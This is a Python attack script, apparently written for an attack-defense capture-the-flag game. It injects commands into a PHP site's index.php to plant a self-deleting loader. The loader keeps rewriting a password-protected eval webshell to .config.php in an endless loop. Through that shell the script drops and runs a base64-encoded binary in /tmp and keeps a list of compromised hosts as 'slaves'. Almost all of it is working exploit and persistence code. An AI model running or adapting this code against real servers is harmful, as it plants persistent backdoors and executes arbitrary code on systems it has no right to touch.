import requests
import hackhttp
import os

passwd = 'huasir'

def getslaves():
    fp = open('slaves.txt','rb')
    fn = open('slavesn.txt','wb')
    slaves = []
    for i in fp.readlines():
        if i.strip() not in slaves:
            slaves.append(i.strip())
    fp.close()
    for i in slaves:
        fn.write(i+"\n")
    fn.close()
    os.remove('slaves.txt')
    os.rename('slavesn.txt','slaves.txt')
    return slaves

def getbase64():
    return open('base.txt','rb').read().strip()

def put_bintrojan(url):
    print '[*]Attacking '+url
    sess = requests.session()
    uri = '/.config.php'
    key = '1'
    dirr = uri[:uri.rindex('/')]
    try: 
        put_memo='''system("echo '%s' | base64 -d > /tmp/check && chmod +x /tmp/check && /tmp/check");'''%getbase64()
        # put_memo = "echo getcwd();"
        # print put_memo
        try:
            res = sess.post(url+uri,data={'0':passwd,key:put_memo},timeout=3).content
            print res
        except:
            res = 'ok'

        if res == 'ok':
            print '[+]memory trojan insert success!'
        else:
            print '[-]memory trojan insert fail!'
            print res
            # exit()
    except Exception:
        print "[-]Attack fail"
        pass

def put_active(url):
    print '[*]Attacking '+url
    sess = requests.session()
    uri = '/index.php'
    key = 'system'
    dirr = uri[:uri.rindex('/')]
    try:
        # eval_memo='''var_dump(file_put_contents(__DIR__."/.m.php","<?php eval(base64_decode('c2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpAdW5saW5rKF9fRklMRV9fKTsKJGZpbGUgPSAnLmNvbmZpZy5waHAnOwokc2hlbGw9J1BEOXdhSEFLSkdzZ1BTQnBjM05sZENna1gxSkZVVlZGVTFSYk1GMHBQeVJmVWtWUlZVVlRWRnN3WFRvbkp6c0thV1lnS0cxa05TZ2theWtnUFQwOUlDYzVNMkZsT1RSaFpUQTFaVGs0TUdVeE1HTTVabUZpT0dKbE9HTm1NVEZpTXljcGV3b2tZU0E5SUNSZlVrVlJWVVZUVkZzeFhUc0tKR0lnUFNCdWRXeHNPd3BsZG1Gc0tDUmlMaVJoTGlSaUtUc0tmUW8vUGc9PSc7CndoaWxlKHRydWUpewogICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsIGJhc2U2NF9kZWNvZGUoJHNoZWxsKSk7CiAgICBAc3lzdGVtKCJjaG1vZCA2MDAgLmNvbmZpZy5waHAiKTsKICAgIHVzbGVlcCg1MDApOwp9'));?>"));'''
        #+ --> %2b
        echo_memo='''echo 'PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpAdW5saW5rKF9fRklMRV9fKTsKJGZpbGUgPSAnLmNvbmZpZy5waHAnOwokc2hlbGw9J1BEOXdhSEFLSkdzZ1BTQnBjM05sZENna1gxSkZVVlZGVTFSYk1GMHBQeVJmVWtWUlZVVlRWRnN3WFRvbkp6c0thV1lnS0cxa05TZ2theWtnUFQwOUlDYzVNMkZsT1RSaFpUQTFaVGs0TUdVeE1HTTVabUZpT0dKbE9HTm1NVEZpTXljcGV3b2tZU0E5SUNSZlVrVlJWVVZUVkZzeFhUc0tKR0lnUFNCdWRXeHNPd3BsZG1Gc0tDUmlMaVJoTGlSaUtUc0tmUW8vUGc9PSc7CndoaWxlKHRydWUpewogICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsIGJhc2U2NF9kZWNvZGUoJHNoZWxsKSk7CiAgICBAc3lzdGVtKCJjaG1vZCA2MDAgLmNvbmZpZy5waHAiKTsKICAgIHVzbGVlcCg1MDApOwp9Cj8%2bbW1t'|base64 -d > .m.php'''
        try:
            # res = sess.post(url+uri,data={key:echo_memo},timeout=3).content
            res = sess.get(url+uri+"?%s=%s"%(key,echo_memo),timeout=3)
            code = res.status_code
            info = res.content
        except:
            info = ''
            code = 404

        if 'int(' in info or code == 200:
            print '[+]memory trojan insert success!'
        else:
            print '[-]memory trojan insert fail!'
            print info
            # exit()

        uri2 = dirr+'/.m.php'
        try:
            # print url+uri2
            res2 = sess.get(url+uri2,timeout=3)
            code = res2.status_code
        except:
            code = 200
        if code == 200:
            print '[+]memory trojan active success!'
            with open('slaves.txt','ab') as f:
                dirr = uri2[:uri2.rindex('/')]
                f.write(url+dirr+"/.config.php\n")
        else:
            print '[-]memory trojan active fail!'
            print '[*]status code: %d'%code
        
    except Exception:
        print "[-]Attack fail"
        pass

def getflag(listt):
    for i in listt:
        cmd = 'system("id");'
        res = requests.post(i,data={'0':'huasir','1':cmd}).content
        print res

if __name__ == '__main__':
    targets = ['http://192.168.221.134']
    for tt in targets:
        put_active(tt)
    # slaves = getslaves()
    # print slaves
    # getflag(slaves)
